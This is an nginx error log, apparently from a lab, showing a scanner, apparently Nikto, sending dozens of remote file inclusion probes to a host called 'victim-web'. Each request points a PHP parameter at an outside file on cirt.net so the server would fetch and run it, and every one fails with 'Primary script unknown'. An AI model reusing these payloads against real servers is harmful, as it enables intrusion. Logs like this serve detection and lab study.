2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /click.php?dir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /client.php?dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /client/faq_1/PageController.php?dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /clients/index.php?src=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cls_fast_template.php?fNikto=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cls_fast_template.php?fname=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cm68news/engine/oldnews.inc.php?addpath=http://cirt.net/public/rfiinc.txt?& HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/Orlando/modules/core/logger/init.php?GLOBALS[preloc]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/ManagerResource.class.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/ManagerRightsResource.class.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/RegForm.class.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/RegResource.class.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/RegRightsResource.class.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/meetweb/classes/modules.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/modules/form.lib.php?sourceFolder=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cms/system/openengine.php?oe_classpath=http://cirt.net/public/rfiinc.txt??? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cmsimple2_7/cmsimple/cms.php?pth['file']['config']=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cn_config.php?tpath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /coast/header.php?sections_file=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /code/berylium-classes.php?beryliumroot=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /code/berylium-classes.php?beryliumroot=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /code/display.php?admindir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /com_booklibrary/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /com_media_library/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /com_realestatemanager/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /com_vehiclemanager/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /comments.php?AMG_serverpath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /comments.php?scriptpath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.inc.php?CFG[libdir]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.inc.php?CFG[libdir]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.inc.php?base_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?db_file=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?ezt_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?include_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?livealbum_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?livealbum_dir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?locale=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common.php?phpht_real_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common/db.php?commonpath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common/func.php?CommonAbsD=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /common/func.php?CommonAbsDir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /community/Offline.php?sourcedir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /components/calendar/com_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
